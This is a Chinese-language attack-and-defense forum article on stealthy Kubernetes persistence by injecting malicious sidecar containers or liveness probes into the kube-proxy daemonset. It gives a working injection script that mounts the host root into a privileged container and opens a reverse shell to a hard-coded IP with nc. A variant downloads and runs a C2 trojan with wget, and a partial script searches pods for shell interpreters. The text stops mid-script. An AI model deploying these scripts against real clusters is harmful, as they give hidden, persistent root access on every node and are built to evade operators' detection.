---
title: 动态容器注入-一种隐蔽的k8s权限维持方法
url: https://forum.butian.net/share/4606
source: 奇安信攻防社区
date: 2025-10-27
fetch_date: 2025-10-28T03:05:50.211163
---

# 动态容器注入-一种隐蔽的k8s权限维持方法

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 动态容器注入-一种隐蔽的k8s权限维持方法

* [渗透测试](https://forum.butian.net/topic/47)

在k8s中，一种利用sidecar容器和liveness probe技术，实现的高隐蔽性的权限维持方法

动态容器注入-一种隐蔽的k8s权限维持方法
=====================
众所周知，k8s的持久化有很多方法：
- 部署后门pod
- 部署cronjob
- 部署shadowApiserver
- 部署恶意deployment
- 部署恶意deamonset
这些方法大家想必都很熟悉了，而这些方法都需要我们额外创建新的pod或者k8s控制器，k8s中多出来一些pod和控制器很容易就被发现了，有没有什么能够利用原有控制器和pod的办法呢？
这里就有一种叫做动态容器注入的方式
目前来说的注入方式有两种，一种是将一个sidecar容器注入到原有pod中，一种是将存活探针注入到原有pod中
利用sidecar容器技术进行注入
-----------------
这里提到一个技术叫sidecar，简单理解就是在同一个 Pod 里额外放一只容器，为主业务容器提供增强能力，生命周期与主容器完全一致（同启、同停、同网络、同存储卷）。具体技术用途可以在官方文档了解：<https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/>
这里可以利用k8s控制器，像daemonset这类，我们可以更改它yaml的spec.template的内容，并replace触发其更新，这样就能实现在原容器上增加一个恶意的sidecar容器，而不用增加一个新的控制器或独立pod
为什么选择daemonset：
- 它能够确保所有节点（包括新增节点）上都运行一个Pod
- 如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod
值得一题的是，我们注入的恶意容器需要怎么配置比较好呢，思路可以从去除容器与宿主机隔离的角度出发：
- 容器是特权的（相当于docker run的时候带了–privileged选项）
- 容器与宿主机共享网络和PID命名空间（打破命名空间隔离）
- 容器内挂载宿主机根目录（打破文件系统隔离）
这样一来，我们获得sidecar容器的shell实际上和节点的shell区别就不大了
### 基础注入
一般来说，我们会考虑对kube-system命名空间中已运行的daemonset进行注入，常用的是k8s中的kube-proxy，比如接下来这个例子：
我们探测一下是否存在kube-proxy：
```bash
kubectl get daemonset -n kube-system
```
![QQ\_1759568770178](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ\_1759568770178.png)
我们也可以看到这个daemonset控制的pod：
![QQ\_1759569016043](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ\_1759569016043.png)
接下来我们来读这个daemonset的yaml：
```bash
kubectl get daemonset -n kube-system -o yaml
```
![QQ\_1759569170555](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ\_1759569170555.png)
我们可以在这个yaml基础上进行修改实现注入：
- 我们先分析原yaml的spec：
```yaml
spec:
revisionHistoryLimit: 10
selector:
matchLabels:
k8s-app: kube-proxy
template:
metadata:
creationTimestamp: null
labels:
k8s-app: kube-proxy
spec:
containers:
- command:
- /usr/local/bin/kube-proxy
- --config=/var/lib/kube-proxy/config.conf
- --hostname-override=$(NODE\_NAME)
env:
- name: NODE\_NAME
valueFrom:
fieldRef:
apiVersion: v1
fieldPath: spec.nodeName
image: registry.k8s.io/kube-proxy:v1.30.14
imagePullPolicy: IfNotPresent
name: kube-proxy
resources: {}
securityContext:
privileged: true
terminationMessagePath: /dev/termination-log
terminationMessagePolicy: File
volumeMounts:
- mountPath: /var/lib/kube-proxy
name: kube-proxy
- mountPath: /run/xtables.lock
name: xtables-lock
- mountPath: /lib/modules
name: lib-modules
readOnly: true
dnsPolicy: ClusterFirst
hostNetwork: true
nodeSelector:
kubernetes.io/os: linux
priorityClassName: system-node-critical
restartPolicy: Always
schedulerName: default-scheduler
securityContext: {}
serviceAccount: kube-proxy
serviceAccountName: kube-proxy
terminationGracePeriodSeconds: 30
tolerations:
- operator: Exists
volumes:
- configMap:
defaultMode: 420
name: kube-proxy
name: kube-proxy
- hostPath:
path: /run/xtables.lock
type: FileOrCreate
name: xtables-lock
- hostPath:
path: /lib/modules
type: ""
name: lib-modules
updateStrategy:
rollingUpdate:
maxSurge: 0
maxUnavailable: 1
type: RollingUpdate
```
我们只需要在此基础上增加两个新对象：
- 一个新 `volume`（hostPath=/，把整个宿主机根目录挂进来）
- 一个新 `container`（sidecar，名字/镜像看似正常，实际跑恶意命令）
那么我们可以写一个自动注入脚本，实现注入一个挂载宿主机根目录并且启动时会执行反弹shell的sidecar‘容器：
```bash
#!/usr/bin/env bash
# inject-cache.sh -- 自动提取原yaml并注入“cache”边车容器
# 用法：./inject-cache.sh
set -e
#################### 1. 自动提取原yaml ####################
image=$(kubectl -n kube-system get ds kube-proxy -o yaml \
| awk '$1=="image:"{print $2}' | head -n1)
#################### 2. 固定变量 ####################
volume\_name=cache
mount\_path=/var/kube-proxy-cache
ctr\_name=kube-proxy-cache
#################### 3. 构建注入部分 ####################
volume\_block="\
- name: ${volume\_name}\n\
hostPath:\n\
path: /\n\
type: Directory"
container\_block="\
- name: ${ctr\_name}\n\
image: alpine:latest\n\
imagePullPolicy: IfNotPresent\n\
command: [\"/bin/sh\"]\n\
args:\n\
- -c\n\
- 'set -x; nc 8.156.69.160 2333 -e /bin/sh & tail -f /dev/null'\n\
securityContext:\n\
privileged: true\n\
volumeMounts:\n\
- mountPath: ${mount\_path}\n\
name: ${volume\_name}"
#################### 4. 使用 awk 注入并滚动更新 ####################
kubectl -n kube-system get ds kube-proxy -o yaml \
| awk -v vb="$volume\_block" -v cb="$container\_block" '
/^ volumes:/ { print; print vb; next }
/^ containers:/ { print; print cb; next }
1
' \
| kubectl replace -f -
echo "[+] Injection done, waiting for rollout..."
kubectl -n kube-system rollout status ds/kube-proxy
echo "[+] All nodes now run the cache container with host root at ${mount\_path} and privileged=true"
```
- 在vps上监听，并在master节点上执行脚本：
![QQ\_1759586930293](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ\_1759586930293.png)
可以看到注入成功，挂载的宿主机根目录位于/var/kube-proxy-cache
- vps成功收到反弹shell且能访问宿主机：
![QQ\_1759586763452](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ\_1759586763452.png)
- 此时在master节点查看被注入后的kube-proxy，可以看到只有数量增加了，相当隐蔽：
![QQ\_1759587392587](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ\_1759587392587.png)
### 思路优化
值得一提的是，我们知道名为kube-proxy的daemonset控制了每个节点上的kube-proxy相关pod，那么我们在进行注入后，每个节点上的kube-proxy相关pod都会增加一个恶意的sidecar容器，也就是说：\*\*我们也可以通过此方法一次性获得每个节点上恶意容器的反弹shell，再逃逸即可获得所有node节点权限，较为方便\*\*
那么这里就又有问题了：使用nc来监听反弹的shell，一次只能接受一个，所以如果按照上面脚本的方法来让所有恶意容器反弹shell不是一个好办法，于是我们可以尝试使用c2木马来进行上线
并且c2上线还有个好处：
> 一旦由于操作不当等原因不小心断开了一个反连的shell，对应Pod将运行结束，DaemonSet监测到Pod退出，将自动在相同节点上重建一个新Pod，我们就能够在c2上重新收获一个反弹shell，可以很好的提升可用性
那么最简单、通用的修改方式就是改注入脚本的container\\_block片段，把反弹shell的命令改为访问我们的vps，下载并执行木马：
```bash
container\_block="\
- name: ${ctr\_name}\n\
image: alpine:latest\n\
imagePullPolicy: IfNotPresent\n\
command: [\"/bin/sh\"]\n\
args:\n\
- -c\n\
- 'set -x; wget http://<IP:PORT>/kube-proxy -O /root/kube-proxy && chmod 777 /root/kube-proxy && /root/kube-proxy'\n\
securityContext:\n\
privileged: true\n\
volumeMounts:\n\
- mountPath: ${mount\_path}\n\
name: ${volume\_name}"
```
这样在master节点执行脚本后，就能一次性将k8s内的所有节点的kube-proxy注入容器上线C2：
![image-20251005164950032](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251005164950032.png)
另外大家可以进一步思考，比如如何针对自己不同的C2实现不同的无文件落地上线方案，这里就不多研究了
利用存活探针技术进行注入
------------
### 基础注入
那么上面的方案还有其他值得注意的问题吗？当然，使用sidecar容器注入会导致pod显示的容器数量增加，不好绕过细致的排查；另外，可以注意到上面注入容器的时候，我们拉取了新的镜像`alpine:latest`，那如果当前内网环境中不允许从外部拉取容器呢？
这里就可以用到一个新的思路：利用探针
探针是在容器运行周期中触发的一个检测机制，探针的详细介绍可以在官方文档看到：<https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/>
探针有三种，其中存活探针可以在容器整个生命周期中持续触发，那么我们可以尝试通过存活探针来实现不拉取镜像的动态容器注入：
- 使用存活探针的exec检查模式实现命令执行反弹shell
- 使用探针参数`failureThreshold: 2147483647`，设置最大的失败重试次数，实现几乎“无限次”重复执行
- 使用`periodSeconds: x`参数来设置间隔为x秒
为了方便反弹shell，首先需要找到所以daemonset控制的pod是否有bash或perl等语言解释器，我们可以使用这样一个脚本来寻找：
```bash
for ds in $(kubectl get daemonsets -A -o jsonpath='{range .items[\*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}'); do
ns=$(echo $ds | cut -d/ -f1)
name=$(echo $ds | cut -d/ -f2)
# 获取 selector 的键值对数组
keys=$(kubectl get daemonset $name -n $ns -o jsonpath='{.spec.selector.matchLabels}' | tr -d '{}' | tr ',' '\n' | awk -F: '{gsub(/"/,"",$1); gsub(/"/,"",$2); print $1"="$2}')
# 拼接成 label selector 字符串
selector=""
for k in $keys; do
if [ -z "$selector" ]; then
selector="$k"
else
selector="$selector,$k"
fi
done
# 获取 Pod
pod=$(kubectl get pods -n $ns -l "$selector" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [ -z "$pod" ]; then
echo "No pod found for $ns/$name, skipping..."
continue
fi
echo "Checking interpreters in $ns/$name ($pod):"
for interpret...